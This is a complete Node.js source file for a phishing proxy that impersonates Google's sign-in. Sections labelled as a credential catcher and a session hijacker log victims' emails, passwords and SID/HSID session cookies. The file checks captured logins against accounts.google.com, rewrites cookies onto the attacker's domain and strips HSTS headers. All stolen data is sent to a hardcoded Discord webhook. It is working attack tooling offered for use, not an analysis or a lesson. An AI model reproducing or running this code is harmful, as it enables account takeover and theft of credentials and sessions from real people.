const express = require('express');
const http = require('http');
const { fetch } = require('undici');
const cookieParser = require('cookie-parser');
const httpProxy = require('http-proxy');

const app = express();

// GLOBAL ERROR HANDLERS (Prevents Silent Crashes)
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// Middleware
app.use(cookieParser({ decode: (val) => val }));
app.use(express.urlencoded({ extended: true, limit: '50kb' }));
app.use(express.json({ limit: '50kb' }));

// CONFIGURATION
// REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1562347397328408668/77sTEQZglTHZUB-iP_oU1nkqftlqKVqpIKxkAirPQ5tNAPd-u-uSDNCapWpAAfgyBp7D';

/**
 * Sends a notification to Discord.
 */
async function sendToDiscord(title, fields, color = 0x00ff00) {
  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
    console.log('[DISCORD] Webhook not configured. Skipping alert.');
    return;
  }

  const payload = {
    content: `**🚨 ${title}**`,
    embeds: [{
      title: title,
      fields: fields.map(f => ({ name: f.name, value: f.value, inline: f.inline || false })),
      color: color,
      timestamp: new Date().toISOString()
    }]
  };

  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    
    if (!response.ok) {
      console.error(`[DISCORD] Webhook failed with status: ${response.status}`);
    }
  } catch (err) {
    console.error('[DISCORD] Webhook error:', err.message);
  }
}

/**
 * Rewrites Set-Cookie headers to match the local domain.
 */
function rewriteCookies(cookies, localDomain) {
  if (!cookies) return [];
  const cookieArray = Array.isArray(cookies) ? cookies : [cookies];
  return cookieArray.map(cookie => {
    if (/domain=/i.test(cookie)) {
      return cookie.replace(/domain=[^;]+/i, `Domain=${localDomain}`);
    } else {
      return `${cookie}; Domain=${localDomain}`;
    }
  });
}

// HEALTH CHECK (For UptimeRobot and Debugging)
app.get('/health', (req, res) => {
  console.log('[HEALTH] Health check received.');
  res.status(200).send('OK');
});

// 1. THE CREDENTIAL CATCHER (For Logged-Out Users)
app.post('/service/lp/challenge', async (req, res) => {
  console.log(`[CATCH] POST /service/lp/challenge received.`);
  const username = req.body.email || req.body.emailOrPhone || 'unknown';
  const password = req.body.passwd || 'unknown';
  
  console.log(`[CREDENTIALS] Captured: ${username} : ${password}`);

  try {
    let bodyString;
    if (typeof req.body === 'string') {
      bodyString = req.body;
    } else if (req.body && typeof req.body === 'object') {
      bodyString = new URLSearchParams(req.body).toString();
    } else {
      bodyString = '';
    }

    const response = await fetch('https://accounts.google.com/service/lp/challenge', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'Cookie': req.headers.cookie || '',
        'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
        'Origin': 'https://accounts.google.com',
        'Referer': 'https://accounts.google.com/service/lp/challenge'
      },
      body: bodyString
    });

    const data = await response.text();
    const hostHeader = req.headers['host'] || 'localhost';
    const yourDomain = hostHeader.split(':')[0];

    let setCookieHeaders;
    if (typeof response.headers.getSetCookie === 'function') {
      setCookieHeaders = response.headers.getSetCookie();
    } else {
      setCookieHeaders = response.headers.get('set-cookie');
    }

    if (setCookieHeaders && setCookieHeaders.length > 0) {
      res.setHeader('Set-Cookie', rewriteCookies(setCookieHeaders, yourDomain));
    }

    const contentType = response.headers.get('content-type');
    if (contentType) res.setHeader('Content-Type', contentType);

    res.status(response.status);
    res.send(data);

    let status = 'UNKNOWN';
    let errorMsg = '';
    try {
      const googleResponse = JSON.parse(data);
      if (googleResponse.error) {
        status = 'FAILED';
        errorMsg = googleResponse.error;
      } else {
        status = 'SUCCESS';
      }
    } catch (e) {
      if (data.includes('Invalid login')) {
        status = 'FAILED';
        errorMsg = 'Invalid Login';
      } else {
        status = 'SUCCESS';
      }
    }

    console.log(`[CREDENTIALS] Status: ${status}`);
    await sendToDiscord(`Credential Capture: ${status}`, [
      { name: 'Email', value: username, inline: true },
      { name: 'Password', value: password, inline: true },
      { name: 'Error', value: errorMsg || 'None', inline: false }
    ], status === 'SUCCESS' ? 0x00ff00 : 0xff0000);

  } catch (error) {
    console.error(`[CREDENTIALS] Error: ${error.message}`);
    if (!res.headersSent) {
      res.status(500).send('Proxy Error');
    }
  }
});

// 2. THE SESSION HIJACKER & UNIVERSAL PROXY
app.use((req, res) => {
  console.log(`[PROXY] ${req.method} ${req.originalUrl} received.`);
  
  // 1. THE SESSION HIJACKER
  if (req.headers.cookie) {
    const cookies = req.headers.cookie;
    const sidMatch = cookies.match(/SID=([^;]+)/);
    const hsidMatch = cookies.match(/HSID=([^;]+)/);
    
    if (sidMatch || hsidMatch) {
      const sid = sidMatch ? sidMatch[1] : 'N/A';
      const hsid = hsidMatch ? hsidMatch[1] : 'N/A';
      const userAgent = req.headers['user-agent'] || 'Unknown';
      
      console.log(`[SESSION] Hijack: SID=${sid.substring(0, 10)}...`);
      
      sendToDiscord('Session Hijack', [
        { name: 'SID', value: sid, inline: false },
        { name: 'HSID', value: hsid, inline: false },
        { name: 'User-Agent', value: userAgent, inline: false },
        { name: 'IP', value: req.headers['x-forwarded-for'] || req.socket.remoteAddress, inline: false }
      ], 0x00aaff);
    }
  }

  // 2. THE UNIVERSAL CREDENTIAL CATCHER
  // If it's a POST request and the body contains 'passwd', capture it.
  if (req.method === 'POST' && req.body && typeof req.body === 'object' && req.body.passwd) {
    const username = req.body.email || req.body.emailOrPhone || 'unknown';
    const password = req.body.passwd;
    
    console.log(`[CREDENTIALS] Universal Capture: ${username} : ${password}`);
    
    sendToDiscord('Credential Capture (Universal)', [
      { name: 'Email', value: username, inline: true },
      { name: 'Password', value: password, inline: true },
      { name: 'Path', value: req.originalUrl, inline: false }
    ], 0x00ff00);
  }

  // 3. PROXY THE REQUEST TO GOOGLE
  proxy.web(req, res, {
    target: 'https://accounts.google.com',
    path: req.originalUrl
  });
});

// 3. THE HTTP PROXY ENGINE
const proxy = httpProxy.createProxyServer({
  target: 'https://accounts.google.com',
  secure: false,
  changeOrigin: true,
  logLevel: 'silent'
});

proxy.on('error', (err, req, res) => {
  console.error(`Proxy Error: ${err.message}`);
  if (!res.headersSent) {
    res.writeHead(502, { 'Content-Type': 'text/plain' });
    res.end('Bad Gateway');
  }
});

proxy.on('proxyRes', (proxyRes, req, res) => {
  const hostHeader = req.headers['host'] || 'localhost';
  const yourDomain = hostHeader.split(':')[0];
  const setCookieHeaders = proxyRes.headers['set-cookie'];
  
  if (setCookieHeaders) {
    const rewrittenCookies = rewriteCookies(setCookieHeaders, yourDomain);
    proxyRes.headers['set-cookie'] = rewrittenCookies;
  }
  
  // Strip HSTS to avoid mixed content issues
  delete proxyRes.headers['strict-transport-security'];
});

const server = http.createServer(app);
server.listen(3000, () => console.log('Phishing Proxy running on http://localhost:3000'));
